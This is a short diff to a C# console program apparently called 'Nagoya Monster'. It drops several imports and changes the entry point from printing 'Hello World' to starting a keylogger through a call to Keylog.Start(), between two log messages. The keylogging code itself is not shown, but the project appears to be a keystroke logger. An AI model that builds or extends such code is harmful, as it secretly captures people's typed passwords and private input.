@@ -1,20 +1,15 @@
-﻿using Microsoft.Win32;
-using System;
-using System.Diagnostics;
-using System.IO;
-using System.Net;
-using System.Reflection;
-using System.Threading;
-
-namespace Nagoya_Monster
+﻿namespace Nagoya_Monster
 {
     class Program
     {
         public static bool isDebugging = true;
- 
+        public static bool isRunning = true;  
+
         private static void Main(string[] args)
         {
-            Log.Add("Hello World");
+            Log.Add("Nagoya Monster Started");
+            Keylog.Start();
+            Log.Add("Nagoya Monster Finished");
         }
     }
 }
